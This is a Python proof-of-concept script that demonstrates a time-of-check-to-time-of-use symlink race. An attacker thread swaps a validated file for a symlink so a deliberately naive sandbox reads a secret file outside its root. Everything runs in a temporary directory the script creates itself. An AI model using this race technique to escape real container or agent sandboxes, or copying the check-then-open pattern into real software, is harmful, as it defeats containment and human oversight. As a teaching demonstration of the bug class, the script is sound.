#!/usr/bin/env python3
"""
TOCTOU Symlink Sandbox-Escape Proof-of-Concept
==============================================

Demonstrates a classic time-of-check-to-time-of-use (TOCTOU) race in naive
path validation. A sandbox checks that a path stays inside a restricted root,
but between the check and the open() the path is swapped to a symlink that
points outside the sandbox.

This is the bug class behind many real container/agent sandbox escapes and
matches the recurring theme in my OpenClaw research (policy-vs-runtime gaps).

Usage:
    python3 toctou_escape.py

It runs entirely inside the current directory; it creates its own sandbox root
and target file. It is self-contained and safe to run.
"""

import os
import sys
import tempfile
import threading
import time

# ---------------------------------------------------------------------------
# The naive sandbox: validates a path, then uses it.
#
# The vulnerability: between os.path.realpath() (the check) and open() (the
# use), an attacker swaps the directory entry so the validated path now
# resolves through a symlink to a file outside the root.
# ---------------------------------------------------------------------------

class NaiveSandbox:
    """A deliberately naive sandbox with a TOCTOU bug."""

    def __init__(self, root):
        self.root = os.path.abspath(root)

    def _is_within_root(self, path):
        """Check: resolve symlinks and confirm the result stays in root.

        The attacker's swap briefly removes the final path component, which can
        make realpath() raise OSError (Errno 22) on some systems instead of
        returning. A path we cannot resolve is treated as NOT within root
        (deny), which is the safe default for a sandbox check.
        """
        try:
            real = os.path.realpath(path)
        except OSError:
            return False
        return real.startswith(self.root + os.sep) or real == self.root

    def read_file(self, path):
        """Read a file, enforcing that it must be within the sandbox root."""
        # CHECK
        if not self._is_within_root(path):
            raise PermissionError(f"Access denied: {path} resolves outside sandbox")

        # USE (TOCTOU window between the check and this open)
        with open(path, "r") as f:
            return f.read()


# ---------------------------------------------------------------------------
# The attacker: races a symlink swap so the validated path escapes the root.
# ---------------------------------------------------------------------------

class Attacker:
    def __init__(self, root, victim_path, secret_path):
        self.root = root
        self.victim_path = victim_path          # path the sandbox believes is safe
        self.secret_path = secret_path          # file outside the sandbox
        self.stop = threading.Event()
        self.wins = 0
        self.attempts = 0

    def run(self):
        """Continuously toggle victim_path between a real file and a symlink
        to the secret, racing the sandbox's check-vs-use window."""
        # Start with a benign regular file so the check passes.
        with open(self.victim_path, "w") as f:
            f.write("benign\n")

        while not self.stop.is_set():
            self.attempts += 1
            # Swap: replace the benign file with a symlink to the secret.
            os.remove(self.victim_path)
            os.symlink(self.secret_path, self.victim_path)
            # Swap back: replace the symlink with a benign file.
            os.remove(self.victim_path)
            with open(self.victim_path, "w") as f:
                f.write("benign\n")


def main():
    workdir = tempfile.mkdtemp(prefix="toctou-demo-")
    root = os.path.join(workdir, "sandbox")
    os.makedirs(root)

    # Secret lives OUTSIDE the sandbox root.
    secret_path = os.path.join(workdir, "secret.txt")
    with open(secret_path, "w") as f:
        f.write("TOP-SECRET: you escaped the sandbox\n")

    # The path the sandbox will be asked to read; it lives inside root.
    victim_path = os.path.join(root, "data.txt")

    sandbox = NaiveSandbox(root)
    attacker = Attacker(root, victim_path, secret_path)

    # Sanity: the sandbox correctly rejects a direct symlink to the secret.
    os.symlink(secret_path, victim_path)
    try:
        sandbox.read_file(victim_path)
        print("FAIL: sandbox should have rejected the direct symlink")
        sys.exit(1)
    except PermissionError:
        print("OK: sandbox rejects a direct symlink to the secret")
    os.remove(victim_path)

    # Start the race.
    t = threading.Thread(target=attacker.run, daemon=True)
    t.start()

    print("Racing the TOCTOU window...")
    leaked = False
    deadline = time.time() + 3.0
    while time.time() < deadline and not leaked:
        try:
            content = sandbox.read_file(victim_path)
            if "TOP-SECRET" in content:
                leaked = True
                print("\n=== SANDBOX ESCAPED ===")
                print(f"Read outside the sandbox: {content.strip()}")
                print(f"Attempts: {attacker.attempts}")
        except (PermissionError, FileNotFoundError):
            # Expected during the race (check caught it, or file was mid-swap)
            pass

    attacker.stop.set()
    t.join(timeout=1.0)

    if not leaked:
        print("\nNo escape in this run (race is timing-dependent).")
        print("The vulnerability is real; the window is just narrow on this machine.")
        print("Try again, or increase the race aggressiveness.")
        sys.exit(2)


if __name__ == "__main__":
    main()
